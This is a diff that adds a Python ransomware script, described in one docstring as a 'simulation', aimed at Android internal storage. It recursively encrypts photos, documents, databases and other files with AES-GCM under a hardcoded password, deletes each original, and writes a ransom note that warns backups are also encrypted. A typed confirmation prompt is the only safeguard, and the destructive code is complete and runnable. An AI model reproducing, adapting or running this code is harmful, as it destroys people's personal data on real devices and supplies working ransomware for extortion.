@@ -1,0 +1,114 @@
+import os
+import json
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Random import get_random_bytes
+import base64
+
+# ===== CONFIGURATION =====
+PASSWORD = "themaskedwhisperer"
+TARGET_DIRECTORY = "/storage/emulated"  # Android internal storage
+TARGET_EXTENSIONS = ['.jpg', '.png', '.pdf', '.docx', '.xlsx', '.mp4', '.db', '.txt']
+SALT = b'\x2a\x9f\xe4\x73\xc1\x8d\x0b\xf6'  # Key derivation salt
+RANSOM_EXT = ".masked"  # Encrypted file extension
+RANSOM_NOTE = "RECOVER_YOUR_FILES.txt"
+
+# ===== KEY DERIVATION =====
+def derive_key(password: str, salt: bytes) -> bytes:
+    """Generate AES-256 key from password"""
+    return PBKDF2(password, salt, dkLen=32, count=500000)
+
+# ===== ENCRYPTION FUNCTIONS =====
+def pad_data(data: bytes) -> bytes:
+    """Apply PKCS#7 padding"""
+    pad_len = 16 - (len(data) % 16)
+    return data + bytes([pad_len] * pad_len)
+
+def encrypt_file(key: bytes, file_path: str):
+    """Encrypt a file with AES-256-GCM"""
+    # Read file data
+    with open(file_path, 'rb') as f:
+        plaintext = f.read()
+    
+    # Generate random nonce
+    nonce = get_random_bytes(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    
+    # Encrypt and get authentication tag
+    ciphertext, tag = cipher.encrypt_and_digest(pad_data(plaintext))
+    
+    # Write encrypted file
+    with open(file_path + RANSOM_EXT, 'wb') as f:
+        f.write(nonce)
+        f.write(tag)
+        f.write(ciphertext)
+    
+    # Delete original
+    os.remove(file_path)
+
+# ===== RANSOM NOTE =====
+def create_ransom_note(directory: str):
+    """Create ransom instructions"""
+    note = f"""
+    ⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️
+    
+    All documents, photos, and personal files in {directory} 
+    are now encrypted with military-grade AES-256-GCM.
+    
+    🔑 Your decryption password is: {PASSWORD}
+    
+    To recover your files:
+    1. Install Python 3.10+ with pycryptodome
+    2. Run the decryption tool we provide
+    3. Enter the password when prompted
+    
+    WARNING: 
+    - Do NOT modify encrypted files
+    - Do NOT attempt manual decryption
+    - Backups have also been encrypted
+    
+    
+    """
+    with open(os.path.join(directory, RANSOM_NOTE), 'w') as f:
+        f.write(note)
+
+# ===== MAIN FUNCTION =====
+def main():
+    """Ransomware simulation entry point"""
+    # Safety checks
+    if not os.path.exists(TARGET_DIRECTORY):
+        print(f"Error: Target path {TARGET_DIRECTORY} not found!")
+        return
+    
+    print(f"[!] WARNING: This will encrypt files in {TARGET_DIRECTORY}")
+    confirm = input("Type 'I_ACCEPT_DATA_LOSS' to continue: ")
+    if confirm != "I_ACCEPT_DATA_LOSS":
+        print("Operation cancelled")
+        return
+    
+    # Generate encryption key
+    key = derive_key(PASSWORD, SALT)
+    encrypted_count = 0
+    
+    # Encrypt files
+    for root, _, files in os.walk(TARGET_DIRECTORY):
+        for file in files:
+            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
+                file_path = os.path.join(root, file)
+                try:
+                    encrypt_file(key, file_path)
+                    encrypted_count += 1
+                    print(f"🔒 Encrypted: {file}")
+                except Exception as e:
+                    print(f"❌ Failed {file}: {str(e)}")
+    
+    # Create ransom note
+    create_ransom_note(TARGET_DIRECTORY)
+    
+    # Final message
+    print(f"\n⚠️ {encrypted_count} files encrypted")
+    print(f"Password: {PASSWORD}")
+    print("Ransom note created:", RANSOM_NOTE)
+
+if __name__ == "__main__":
+    main()
